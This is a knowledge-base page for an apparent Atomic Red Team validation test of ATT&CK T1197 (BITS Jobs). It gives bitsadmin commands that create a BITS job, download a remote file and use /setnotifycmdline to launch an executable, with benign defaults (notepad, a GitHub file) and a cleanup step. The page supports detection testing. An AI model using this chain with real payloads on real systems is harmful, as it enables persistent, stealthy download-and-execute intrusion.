---
atomic_guid: "62a06ec5-5754-47d2-bcfc-123d8314c6ae"
title: "Persist, Download, & Execute"
framework: "atomic"
generated: "true"
attack_technique_id: "T1197"
attack_technique_name: "BITS Jobs"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1197/T1197.yaml"
build_date: "2026-04-26 17:02:12"
executor: "command_prompt"
aliases:
  - "62a06ec5-5754-47d2-bcfc-123d8314c6ae"
  - "Persist, Download, & Execute"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Persist, Download, & Execute

This test simulates an adversary leveraging bitsadmin.exe to schedule a BITS transferand execute a payload in multiple steps.
Note that in this test, the file executed is not the one downloaded. The downloading of a random file is simply the trigger for getting bitsdamin to run an executable.
This has the interesting side effect of causing the executable (e.g. notepad) to run with an Initiating Process of "svchost.exe" and an Initiating Process Command Line of "svchost.exe -k netsvcs -p -s BITS"
This job will remain in the BITS queue until complete or for up to 90 days by default if not removed.

## Metadata

- Atomic GUID: 62a06ec5-5754-47d2-bcfc-123d8314c6ae
- Technique: T1197: BITS Jobs
- Platforms: windows
- Executor: command_prompt
- Source Path: atomics/T1197/T1197.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1197-bits_jobs|T1197]]

## Input Arguments

### bits_job_name

- description: Name of BITS job
- type: string
- default: AtomicBITS

### command_path

- description: Path of command to execute
- type: path
- default: C:\Windows\system32\notepad.exe

### local_file

- description: Local file path to save downloaded file
- type: path
- default: %temp%\bitsadmin3_flag.ps1

### remote_file

- description: Remote file to download
- type: url
- default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md

## Executor

- name: command_prompt

### Command

```cmd
bitsadmin.exe /create #{bits_job_name}
bitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file}
bitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} NULL
bitsadmin.exe /resume #{bits_job_name}
ping -n 5 127.0.0.1 >nul 2>&1
bitsadmin.exe /complete #{bits_job_name}
```

### Cleanup

```cmd
del #{local_file} >nul 2>&1
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1197/T1197.yaml)
